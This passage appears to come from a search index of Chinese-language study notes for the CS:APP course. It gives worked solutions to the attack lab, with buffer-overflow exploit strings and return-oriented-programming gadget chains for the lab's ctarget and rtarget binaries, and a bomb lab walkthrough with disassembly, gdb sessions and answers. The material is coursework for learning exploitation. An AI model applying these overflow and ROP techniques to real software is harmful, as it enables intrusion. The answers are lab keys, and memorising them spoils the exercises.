40 00 00 00 00 00 /* gadget8: movq %rax, %rdi; retq (48 89 c7 c3) */ c5 19 40 00 00 00 00 00 /* first address of touch3 */ fa 18 40 00 00 00 00 00 /* string format of cookie */ 35 39 62 39 39 37 66 61 00","title":"attacklab"},{"location":"_csapp/_Labs/attacklab/#_1","text":"","title":"\u51c6\u5907"},{"location":"_csapp/_Labs/attacklab/#files","text":"ctarget: \u2002 An executable program vulnerable to code-injection attacks rtarget: \u2002 An executable program vulnerable to return-oriented-programming attacks cookie.txt: \u2002 An 8-digit hex code that you will use as a unique identifier in your attacks. farm.c: \u2002 The source code of your target's \"gadget farm\", which you will use in generating return-oriented programming attacks. hex2raw: \u2002 A utility to generate attack strings","title":"Files"},{"location":"_csapp/_Labs/attacklab/#target-program","text":"C source code unsigned getbuf () { char buf [ BUFFER_SIZE ]; Gets ( buf ); return 1 ; } assembly 00000000004017a8 < getbuf >: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 <Gets> 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 4017be: 90 nop 4017bf: 90 nop ctarget \u548c rtarget \u90fd\u901a\u8fc7 getbuf \u4ece\u6807\u51c6\u8f93\u5165\u4e2d\u8bfb\u5165\u5b57\u7b26\u4e32 (terminated by \\n ) \u5e76\u5b58\u50a8 (along with a null terminator)\uff0c\u9700\u8981\u6ce8\u610f: exploit string \u7684\u4efb\u4f55\u4f4d\u7f6e\u90fd\u4e0d\u80fd\u5305\u542b 0x0a (ascii for \\n ) \u901a\u8fc7\u53cd\u6c47\u7f16\u67e5\u770b BUFFER_SIZE","title":"Target Program"},{"location":"_csapp/_Labs/attacklab/#using-hex2raw","text":"\u5c06\u9700\u8981\u7684\u5341\u516d\u8fdb\u5236\u7801\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u4f5c\u4e3a target \u7684\u8f93\u5165\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f: 1.\u2002set a series of pipes cat exploit.txt | ./hex2raw | ./ctarget -q 2.\u2002store the raw string in a file and use I/O redirection ./hex2raw < exploit.txt > exploit-raw.txt ./ctarget < exploit-raw.txt","title":"Using hex2raw"},{"location":"_csapp/_Labs/attacklab/#generating-byte-codes","text":"gcc -c example.s objdump -d example.o > example.d","title":"Generating Byte Codes"},{"location":"_csapp/_Labs/attacklab/#_2","text":"\u51fd\u6570\u8c03\u7528\u8fc7\u7a0b: \u2002 \u4fdd\u5b58\u72b6\u6001 \u2192 \u4f20\u53c2 \u2192 call \u2192 \u5f00\u6808 \u2192 ... \u2192 \u91ca\u653e \u2192 ret","title":"\u77e5\u8bc6\u56de\u987e"},{"location":"_csapp/_Labs/attacklab/#part-i-code-injection-attacks","text":"\u7528 exploit string \u653b\u51fb ctarget \u7a0b\u5e8f\uff0c getbuf \u88ab test \u51fd\u6570\u8c03\u7528 void test () { int val ; val = getbuf (); printf ( \"No exploit. Getbuf returned 0x%x \\n \" , val ); } \u901a\u8fc7 getbuf \u6539\u53d8 buffer\uff0c\u4f7f\u5176\u65e0\u6cd5\u5b89\u5168\u8fd4\u56de test","title":"Part I: Code Injection Attacks"},{"location":"_csapp/_Labs/attacklab/#phase1","text":"phase1 \u4e0d\u8981\u6c42\u6ce8\u5165\u65b0\u4ee3\u7801\uff0c\u53ea\u9700\u8ba9 getbuf \u8fd4\u56de\u5230 touch1 \uff0cC rep: touch1 void touch1 () { vlevel = 1 ; /* Part of validation protocol */ printf ( \"Touch1!: You called touch1() \\n \" ); validate ( 1 ); exit ( 0 ); } phase1.txt /* padding 40 bytes */ ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee /* return: first address of touch1() */ c0 17 40 00 00 00 00 \u53ea\u9700\u8981\u586b\u5145 0x28 \u4e2a\u5b57\u8282\u540e\uff0c\u7528 touch1 \u7684\u5730\u5740 0x4017c0 \u8986\u76d6 test \u7684\u6808\u5e27\uff0c\u6ce8\u610f\u5c0f\u7aef\u6cd5","title":"phase1"},{"location":"_csapp/_Labs/attacklab/#phase2","text":"phase2 \u9700\u8981\u8fd4\u56de\u5230 touch2 \uff0c\u8fd4\u56de\u4e4b\u524d\u8fd8\u8981\u8c03\u7528\u6ce8\u5165\u7684\u4ee3\u7801\u7528\u4e8e\u4f20\u53c2\uff0c\u4f7f val == cookie touch2 void touch2 ( unsigned val ) { vlevel = 2 ; if ( val == cookie ) { printf ( \"Touch2!: You called touch2(0x%.8x) \\n \" , val ); validate ( 2 ); } elee { printf ( \"Misfire: You called touch2(0x%.8x) \\n \" , val ); fail ( 2 ); } exit ( 0 ); } phase2.s pushq $0x4017ec # first address of touch2 mov $0x59b997fa , %rdi # cookie ret phase2.d 0000000000000000 < .text >: 0: 68 ec 17 40 00 pushq $0x4017ec 5: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi c: c3 retq phase2.txt /* padding 40 bytes */ ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee /* return: injectied codes at 0x5561dca0 + 8 */ a8 dc 61 55 00 00 00 00 /* encoding of injected codes */ 68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3 \u901a\u8fc7 gdb \u67e5\u770b getbuf \u6808\u5e27\u5c3e\u7aef\u7684\u5730\u5740\u4e3a 0x5561dca0 \uff0c\u7136\u540e\u7834\u574f test \u7684\u6808\u5e27\uff0c\u4fee\u6539\u8fd4\u56de\u503c\uff0c\u628a\u6ce8\u5165\u7684\u4ee3\u7801\u5b58\u653e\u5728 0x5561dca8 \u3002(\u4e0d\u8981\u4f7f\u7528 call \u6216 jmp \u8fdb\u884c\u8df3\u8f6c)","title":"phase2"},{"location":"_csapp/_Labs/attacklab/#phase3","text":"Level3 \u4e0e Level2 \u76f8\u4f3c\uff0c\u4f46\u9700\u8981\u4f20\u4e00\u4e2a\u5b57\u7b26\u4e32\u6307\u9488\uff0c\u4f7f cookie \u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u4e0e\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u76f8\u7b49 touch3 void touch3 ( char * sval ) { vlevel = 3 ; /* Part of validation protocol */ if ( hexmatch ( cookie , sval )) { printf ( \"Touch3!: You called touch3( \\\" %s \\\" ) \\n \" , sval ); validate ( 3 ); } else { printf ( \"Misfire: You called touch3( \\\" %s \\\" ) \\n \" , sval ); fail ( 3 ); } exit ( 0 ); } hexmatch /* Compare string to hex represention of unsigned value */ int hexmatch ( unsigned val , char * sval ) { char cbuf [ 110 ]; /* Make position of check string unpredictable */ char * s = cbuf + random () % 100 ; sprintf ( s , \"%.8x\" , val ); return strncmp ( sval , s , 9 ) == 0 ; } phase3.s pushq $0x4018fa # first address of touch3 mov $0x5561dca8 , %rdi # address of string constructed manually ret phase3.d 0000000000000000 < .text >: 0: 68 fa 18 40 00 pushq $0x4018fa 5: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi c: c3 phase3.txt /* padding: 40 bytes */ ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee /* return: injected codes at 0x5561dca0 + 8 + 9 */ b1 dc 61 55 00 00 00 00 /* string format of cookie */ 35 39 62 39 39 37 66 61 00 /* encoding of injected codes */ 68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3 \u56e0\u6b64\u5728\u6808\u5e27\u5c3e\u90e8\u987a\u653e cookie \u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u518d\u653e\u7f6e\u6ce8\u5165\u7684\u4ee3\u7801\u3002\u5c3d\u7ba1 touch3 \u8c03\u7528\u5176\u4ed6\u51fd\u6570\uff0c\u4f46\u6ce8\u5165\u5185\u5bb9\u90fd\u653e\u5728\u4e86 test \u7684\u6808\u5e27\u5185\uff0c\u4e0d\u5fc5\u62c5\u5fc3\u88ab\u7834\u574f\u3002","title":"phase3"},{"location":"_csapp/_Labs/attacklab/#part-ii-return-oriented-programming","text":"rtarget uses two techniques to thwart such attacks: Uses randomization, so the stack positions differ from one run to another. Marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault. The strategy with ROP is to identify byte sequences within an existing program that consist of one or more instructions followed by the instruction ret . Gadgets may not be enough to implement many important operations. Fortunately, with a byte-oriented instruction set, such as x86-64, a gadget can often be found by extracting patterns from other parts of the instruction byte sequence. For example: setval_210.c void setval_210 ( unsigned * p ) { * p = 3347663060U ; } setval_210.d 000000000400f15 < setval_210 >: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4, (%rdi) 400f1b: c3 retq The byte sequence 48 89 c7 encodes the instruction movq %rax, %rdi . Thus, this code contains a gadget, having a starting address of 0x400f18 . byte encoding of instructions","title":"Part II: Return-Oriented Programming"},{"location":"_csapp/_Labs/attacklab/#phase4","text":"\u4f7f\u7528 gadget farm \u4e2d\u7684 gadget (\u6700\u591a\u4e24\u4e2a)\uff0c\u5bf9 rtarget \u505a\u548c phase2 \u4e00\u6837\u7684\u4e8b: \u9996\u5148\u4fee\u6539\u8fd4\u56de\u5730\u5740\uff0c\u4f7f\u4e4b\u8df3\u8f6c\u5230\u7b2c\u4e00\u4e2a gadget gadget \u9700\u8981\u628a cookie pop \u5230\u4e00\u4e2a\u5bc4\u5b58\u5668 r \uff0c\u7136\u540e mov r, %rdi \uff0c\u6700\u540e\u8fd4\u56de\u5230 touch2 \u56e0\u6b64\uff0c\u9996\u5148\u641c\u7d22 pop r \u7684\u7f16\u7801\uff0c\u7136\u540e\u518d\u641c\u7d22\u5bf9\u5e94\u7684 mov r, %rdi \u7f16\u7801 used gadgets 00000000004019a7 < addval_219 >: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq ... ... 00000000004019c3 < setval_426 >: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 phase4.txt /* padding: 40 bytes */ ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee /* gadget1: pop %rax; retq (58 c3) */ ab 19 40 00 00 00 00 00 /* cookie */ fa 97 b9 59 00 00 00 00 /* gadget2: movq %rax, %rdi; retq (48 89 c7 c3) */ c5 19 40 00 00 00 00 00 /* first address of touch2 */ ec 17 40 00 00 00 00 00","title":"phase4"},{"location":"_csapp/_Labs/attacklab/#phase5","text":"\u505a\u548c phase3 \u7684\u4e00\u6837\u7684\u4e8b\uff0c\u5373\u4f20\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff1b\u96be\u70b9\u5728\u4e8e\uff0c\u7531\u4e8e\u6808\u968f\u673a\u5316\uff0c\u9700\u8981\u4f7f\u7528 %rsp \u7684\u503c\u3002\u9996\u5148\u5728 gadgets \u4e2d\u67e5\u627e\u53ef\u7528\u7684 mov pattern: byte encoding instruction address 48 89 c7 90 c3 movq %rax, %rdi 0x4019c3 48 89 e0 c3 movq %rsp, %rax 0x401a03 89 c2 90 c3 movl %eax, %edx 0x4019db 89 ce 90 90 c3 movl %ecx, %esi 0x401a11 89 d1 38 c9 movl %edx, %ecx 0x401a33 gadgets \u4e2d\u8fd8\u63d0\u4f9b\u4e86\u4e00\u4e2a add_xy \u51fd\u6570\uff0c\u7ed3\u5408\u5b58\u5728\u7684 mov pattern\uff0c\u53ef\u4ee5\u5148\u7531 add_xy \u8ba1\u7b97\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u518d\u4f20\u5165 touch3 phase5 answers used gadgets 00000000004019a7 < addval_219 >: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq ... ... 00000000004019db < getval_481 >: 4019db: b8 5c 89 c2 90 mov $0x90c2895c,%eax 4019e0: c3 ... ... 00000000004019c3 < setval_426 >: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq ... ... 0000000000401a03 < addval_190 >: 401a03: 8d 87 41 48 89 e0 lea -0x1f76b7bf(%rdi),%eax 401a09: c3 retq ... ... 0000000000401a11 < addval_436 >: 401a11: 8d 87 89 ce 90 90 lea -0x6f6f3177(%rdi),%eax 401a17: c3 retq ... ... 0000000000401a33 < getval_159 >: 401a33: b8 89 d1 38 c9 mov $0xc938d189,%eax 401a38: c3 retq ... ... 00000000004019d6 < add_xy >: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq phase5.txt /* padding: 40 bytes */ ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee /* gadget1: movq %rsp, %rax; retq (48 89 e0 c3) */ 06 1a 40 00 00 00 00 00 /* gadget2: movq %rax, %rdi; retq (48 89 c7 90 c3) */ c5 19 40 00 00 00 00 00 /* gadget3: popq %rax; retq (58 90 c3) */ ab 19 40 00 00 00 00 00 /* bias: 72 */ 48 00 00 00 00 00 00 00 /* gadget4: movl %eax, %edx; retq (89 c2 90 c3) */ dd 19 40 00 00 00 00 00 /* gadget5: movl %edx, %ecx; retq (89 d1 38 c9 c3) */ 34 1a 40 00 00 00 00 00 /* gadget6: movl %ecx, %esi; retq (89 ce 90 90 c3) */ 13 1a 40 00 00 00 00 00 /* gadget7: add_xy: %rax = %rdi + %rsi */ d6 19 40 00 00 00 00 00 /* gadget8: movq %rax, %rdi; retq (48 89 c7 c3) */ c5 19 40 00 00 00 00 00 /* first address of touch3 */ fa 18 40 00 00 00 00 00 /* string format of cookie */ 35 39 62 39 39 37 66 61 00","title":"phase5"},{"location":"_csapp/_Labs/bomblab/","text":"\u51c6\u5907 \ud83e\uddd0 \u4e3b\u8981\u7528\u5230\u7684\u4e00\u4e9b\u77e5\u8bc6: \u4f20\u53c2: %rdi, %rsi, %rdx, %rcx, %r8, %r9 \u8df3\u8f6c\u6307\u4ee4 \u6709\u7b26\u53f7: jg (>), jge (>=), jl (<), jle (<=) \uff08greater, less) \u65e0\u7b26\u53f7: ja (>), jae (>=), jb (<), jbe (<=) (above, below) objdump -d \u57fa\u672c gdb \u6307\u4ee4: command effect command effect run [args] \u8fd0\u884c stepi \u6267\u884c 1 \u6761\u6307\u4ee4 quit \u9000\u51fa gdb stepi 4 \u6267\u884c 4 \u6761\u6307\u4ee4 break <func_name> \u5728\u51fd\u6570\u5165\u53e3\u5904\u8bbe\u7f6e\u65ad\u70b9 nexti \u7c7b\u4f3c stepi \uff0c\u4f46\u4ee5\u51fd\u6570\u4e3a\u5355\u4f4d break* <addr> \u6839\u636e\u5730\u5740\u8bbe\u65ad\u70b9 continue \u7ee7\u7eed\u5230\u4e0b\u4e00\u4e2a\u65ad\u70b9 info b \u67e5\u770b\u6240\u6709\u65ad\u70b9 finish \u8fd0\u884c\u5230\u5f53\u524d\u51fd\u6570\u8fd4\u56de delete [break_num] \u5220\u9664\u65ad\u70b9 info r \u67e5\u770b\u5bc4\u5b58\u5668\u72b6\u6001 info frame \u67e5\u770b\u6808\u5e27\u4fe1\u606f delete \u5220\u9664\u6240\u6709\u65ad\u70b9 \u68c0\u67e5\u6570\u636e: x/[n|format|unitsize] <addr> n : \u2002 \u6b63\u6574\u6570\uff0c\u8868\u793a\u663e\u793a\u51e0\u4e2a unit format : \u2002 \u663e\u793a\u683c\u5f0f\uff0c\u5982 x(hex), t(binary), d(decimal), u(unsigned dec), o(octal), c(char), f(float), s(string) unitsize : \u2002 bhwg (1-8 \u5b57\u8282) print [format] <addr|register> print /x %rax print *(long *) 0xfffffff : \u2002 \u8f93\u51fa\u4f4d\u4e8e 0xffffffff \u7684\u957f\u6574\u6570 Start \ud83e\uddd0 \u6bcf\u4e2a phase \u7684\u683c\u5f0f\u5982\u4e0b: input = read_line (); phase_x ( input ); phase_defused (); \u901a\u8fc7 read_line \u8bfb\u5165\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570 1\uff0c\u5982\u679c\u53ef\u4ee5\u4ece phase_x \u4e2d\u6210\u529f\u8fd4\u56de\uff0c\u8868\u793a\u62c6\u5f39\u6210\u529f phase1 \ud83e\uddd0 phase_1 0000000000400ee0 < phase_1 >: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 <strings_not_equal> 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 <phase_1+0x17> 400ef2: e8 43 05 00 00 callq 40143a <explode_bomb> 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq strings_not_equal 0000000000401338 < strings_not_equal >: 401338: 41 54 push %r12 40133a: 55 push %rbp 40133b: 53 push %rbx 40133c: 48 89 fb mov %rdi,%rbx 40133f: 48 89 f5 mov %rsi,%rbp 401342: e8 d4 ff ff ff callq 40131b <string_length> 401347: 41 89 c4 mov %eax,%r12d 40134a: 48 89 ef mov %rbp,%rdi 40134d: e8 c9 ff ff ff callq 40131b <string_length> 401352: ba 01 00 00 00 mov $0x1,%edx 401357: 41 39 c4 cmp %eax,%r12d 40135a: 75 3f jne 40139b <strings_not_equal+0x63> 40135c: 0f b6 03 movzbl (%rbx),%eax 40135f: 84 c0 test %al,%al 401361: 74 25 je 401388 <strings_not_equal+0x50> 401363: 3a 45 00 cmp 0x0(%rbp),%al 401366: 74 0a je 401372 <strings_not_equal+0x3a> 401368: eb 25 jmp 40138f <strings_not_equal+0x57> 40136a: 3a 45 00 cmp 0x0(%rbp),%al 40136d: 0f 1f 00 nopl (%rax) 401370: 75 24 jne 401396 <strings_not_equal+0x5e> 401372: 48 83 c3 01 add $0x1,%rbx 401376: 48 83 c5 01 add $0x1,%rbp 40137a: 0f b6 03 movzbl (%rbx),%eax 40137d: 84 c0 test %al,%al 40137f: 75 e9 jne 40136a <strings_not_equal+0x32> 401381: ba 00 00 00 00 mov $0x0,%edx 401386: eb 13 jmp 40139b <strings_not_equal+0x63> 401388: ba 00 00 00 00 mov $0x0,%edx 40138d: eb 0c jmp 40139b <strings_not_equal+0x63> 40138f: ba 01 00 00 00 mov $0x1,%edx 401394: eb 05 jmp 40139b <strings_not_equal+0x63> 401396: ba 01 00 00 00 mov $0x1,%edx 40139b: 89 d0 mov %edx,%eax 40139d: 5b pop %rbx 40139e: 5d pop %rbp 40139f: 41 5c pop %r12 4013a1: c3 retq string_length 000000000040131b < string_length >: 40131b: 80 3f 00 cmpb $0x0,(%rdi) 40131e: 74 12 je 401332 <string_length+0x17> 401320: 48 89 fa mov %rdi,%rdx 401323: 48 83 c2 01 add $0x1,%rdx 401327: 89 d0 mov %edx,%eax 401329: 29 f8 sub %edi,%eax 40132b: 80 3a 00 cmpb $0x0,(%rdx) 40132e: 75 f3 jne 401323 <string_length+0x8> 401330: f3 c3 repz retq 401332: b8 00 00 00 00 mov $0x0,%eax 401337: c3 retq \u7531\u6e90\u7801: phase_1 : \u6bd4\u8f83\u5b57\u7b26\u4e32 input \u548c *0x402400 \uff0c\u82e5 strings_not_equal \u8fd4\u56de 0\uff0c\u5219\u6210\u529f\u9000\u51fa strings_not_equal : \u9996\u5148\u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u7136\u540e\u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u7a7a\uff0c\u6700\u540e\u8fdb\u5165\u5faa\u73af\uff0c\u9010\u4e2a\u5b57\u7b26\u6bd4\u8f83 string_length : \u9010\u4e2a\u5b57\u7b26\u5224\u65ad\u662f\u5426\u4e3a \\0 \u901a\u8fc7 gdb \u67e5\u770b 0x402400 \u7684\u503c\u5373\u53ef ( gdb ) b * 0x400ee9 Breakpoint 1 at 0x400ee9 ( gdb ) run ... Breakpoint 1 , 0x0000000000400ee9 in phase_1 () ( gdb ) x / s 0x402400 0x402400 : \"Border relations with Canada have never been better.\" phase2 \ud83e\uddd0 phase2 0000000000400efc < phase_2 >: 400efc: 55 push %rbp 400efd: 53 push %rbx 400efe: 48 83 ec 28 sub $0x28,%rsp 400f02: 48 89 e6 mov %rsp,%rsi 400f05: e8 52 05 00 00 callq 40145c <read_six_numbers> 400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) 400f0e: 74 20 je 400f30 <phase_2+0x34> 400f10: e8 25 05 00 00 callq 40143a <explode_bomb> 400f15: eb 19 jmp 400f30 <phase_2+0x34> 400f17: 8b 43 fc mov -0x4(%rbx),%eax 400f1a: 01 c0 add %eax,%eax 400f1c: 39 03 cmp %eax,(%rbx) 400f1e: 74 05 je 400f25 <phase_2+0x29> 400f20: e8 15 05 00 00 callq 40143a <explode_bomb> 400f25: 48 83 c3 04 add $0x4,%rbx 400f29: 48 39 eb cmp %rbp,%rbx 400f2c: 75 e9 jne 400f17 <phase_2+0x1b> 400f2e: eb 0c jmp 400f3c <phase_2+0x40> 400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a: eb db jmp 400f17 <phase_2+0x1b> 400f3c: 48 83 c4 28 add $0x28,%rsp 400f40: 5b pop %rbx 400f41: 5d pop %rbp 400f42: c3 read_six_numbers 000000000040145c < read_six_numbers >: 40145c: 48 83 ec 18 sub $0x18,%rsp 401460: 48 89 f2 mov %rsi,%rdx 401463: 48 8d 4e 04 lea 0x4(%rsi),%rcx 401467: 48 8d 46 14 lea 0x14(%rsi),%rax 40146b: 48 89 44 24 08 mov %rax,0x8(%rsp) 401470: 48 8d 46 10 lea 0x10(%rsi),%rax 401474: 48 89 04 24 mov %rax,(%rsp) 401478: 4c 8d 4e 0c lea 0xc(%rsi),%r9 40147c: 4c 8d 46 08 lea 0x8(%rsi),%r8 401480: be c3 25 40 00 mov $0x4025c3,%esi 401485: b8 00 00 00 00 mov $0x0,%eax 40148a: e8 61 f7 ff ff callq 400bf0 <__isoc99_sscanf@plt> 40148f: 83 f8 05 cmp $0x5,%eax 401492: 7f 05 jg 401499 <read_six_numbers+0x3d> 401494: e8 a1 ff ff ff callq 40143a <explode_bomb> 401499: 48 83 c4 18 add $0x18,%rsp 40149d: c3 retq \u7531\u6e90\u7801: phase2 \u5c06 input \u548c %rsp \u4f5c\u4e3a\u53c2\u6570\u8c03\u7528 read_six_numbers read_six_numbers \u8c03\u7528 sscanf \u8bfb\u5165 6 \u4e2a\u6574\u6570\u5230 M[%rsp] ~ M[%rsp+0x14] \u56e0\u6b64\u5148\u67e5\u770b format \u53c2\u6570\uff0c\u786e\u5b9a\u5f85\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u683c\u5f0f ( gdb ) x / s 0x4025c3 0x4025c3 : \"%d %d %d %d %d %d\" \u8fdb\u800c\u89c2\u5bdf phase2 \u7684\u5269\u4f59\u90e8\u5206\u5982\u4f55\u5904\u7406\u8bfb\u5165\u7684 6 \u4e2a\u6570\uff0c\u7b2c\u4e00\u4e2a\u6570 M[%rsp] \u5fc5\u987b\u4e3a 1\uff0c\u7136\u540e\uff1a % rbx = % rsp + 4 ; % rbp = % rsp + 24 ; while ( % rbx != % rbp ) { % eax = M [ % rbx - 4 ] * 2 ; if ( M [ % rbx ] != % eax ) explode_bomb (); % rbx += 4 ; } \u56e0\u6b64\u7b54\u6848\u4e3a 1 2 4 8 16 32 phase3 \ud83e\uddd0 0000000000400f43 < phase_3 >: 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 <__isoc99_sscanf@plt> 400f60: 83 f8 01 cmp $0x1,%eax 400f63: 7f 05 jg 400f6a <phase_3+0x27> 400f65: e8 d0 04 00 00 callq 40143a <explode_bomb> 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f: 77 3c ja 400fad <phase_3+0x6a> 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 400f7c: b8 cf 00 00 00 mov $0xcf,%eax 400f81: eb 3b jmp 400fbe <phase_3+0x7b> 400f83: b8 c3 02 00 00 mov $0x2c3,%eax 400f88: eb 34 jmp 400fbe <phase_3+0x7b> 400f8a: b8 00 01 00 00 mov $0x100,%eax 400f8f: eb 2d jmp 400fbe <phase_3+0x7b> 400f91: b8 85 01 00 00 mov $0x185,%eax 400f96: eb 26 jmp 400fbe <phase_3+0x7b> 400f98: b8 ce 00 00 00 mov $0xce,%eax 400f9d: eb 1f jmp 400fbe <phase_3+0x7b> 400f9f: b8 aa 02 00 00 mov $0x2aa,%eax 400fa4: eb 18 jmp 400fbe <phase_3+0x7b> 400fa6: b8 47 01 00 00 mov $0x147,%eax 400fab: eb 11 jmp 400fbe <phase_3+0x7b> 400fad: e8 88 04 00 00 callq 40143a <explode_bomb> 400fb2: b8 00 00 00 00 mov $0x0,%eax 400fb7: eb 05 jmp 400fbe <phase_3+0x7b> 400fb9: b8 37 01 00 00 mov $0x137,%eax 400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2: 74 05 je 400fc9 <phase_3+0x86> 400fc4: e8 71 04 00 00 callq 40143a <explode_bomb> 400fc9: 48 83 c4 18 add $0x18,%rsp 400fcd: c3 \u9996\u5148\u8fd8\u662f\u770b sscanf \u7684 format: ( gdb ) x / s 0x4025cf 0x4025cf : \"%d %d\" \u4e24\u6570\u5206\u522b\u8bfb\u5230\u4e86 arg1 = M[%rsp+8] \u548c arg2 = M[%rsp+12] \u4e2d\uff0c\u5269\u4e0b\u7684\u90e8\u5206\u662f switch-case \u7ed3\u6784\uff0c\u7531\u9ad8\u4eae\u90e8\u5206: \u82e5\u4ee5\u65e0\u7b26\u53f7\u6570\u770b\u5f85 arg1 \uff0c\u5b83\u4e0d\u80fd\u8d85\u8fc7 7 \u901a\u8fc7\u8df3\u8f6c\u8868 M[0x402470 + arg1*8] \u51b3\u5b9a\u8fdb\u5165 0-7 \u54ea\u4e2a\u5206\u652f \u67e5\u770b\u8df3\u8f6c\u8868\u7684\u5185\u5bb9: ( gdb ) x / 8 xg 0x402470 0x402470 : 0x0000000000400f7c 0x0000000000400fb9 0x402480 : 0x0000000000400f83 0x0000000000400f8a 0x402490 : 0x0000000000400f91 0x0000000000400f98 0x4024a0 : 0x0000000000400f9f 0x0000000000400fa6 \u4efb\u9009\u4e00\u4e2a\uff0c\u53d6 0, 0xcf(207) \u5373\u53ef phase4 \ud83e\uddd0 phase4 000000000040100c < phase_4 >: 40100c: 48 83 ec 18 sub $0x18,%rsp 401010: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a: be cf 25 40 00 mov $0x4025cf,%esi 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 <__isoc99_sscanf@plt> 401029: 83 f8 02 cmp $0x2,%eax 40102c: 75 07 jne 401035 <phase_4+0x29> 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033: 76 05 jbe 40103a <phase_4+0x2e> 401035: e8 00 04 00 00 callq 40143a <explode_bomb> 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi 401048: e8 81 ff ff ff callq 400fce <func4> 40104d: 85 c0 test %eax,%eax 40104f: 75 07 jne 401058 <phase_4+0x4c> 401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) 401056: 74 05 je 40105d <phase_4+0x51> 401058: e8 dd 03 00 00 callq 40143a <explode_bomb> 40105d: 48 83 c4 18 add $0x18,%rsp 401061: c3 retq func4 0000000000400fce < func4 >: 400fce: 48 83 ec 08 sub $0x8,%rsp 400fd2: 89 d0 mov %edx,%eax 400fd4: 29 f0 sub %esi,%eax 400fd6: 89 c1 mov %eax,%ecx 400fd8: c1 e9 1f shr $0x1f,%ecx 400fdb: 01 c8 add %ecx,%eax 400fdd: d1 f8 sar %eax 400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 <func4+0x24> 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce <func4> 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 <func4+0x39> 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 <func4+0x39> 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce <func4> 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007: 48 83 c4 08 add $0x8,%rsp 40100b: c3 phase_4 : \u548c phase3 \u4e00\u6837\u8bfb\u5165\u4e24\u4e2a\u6574\u6570\uff0c arg1 \u4f5c\u4e3a\u65e0\u7b26\u53f7\u6570\u5fc5\u987b <=14 \uff0c arg2 \u5fc5\u987b\u662f 0 \u8c03\u7528 func4(arg1, 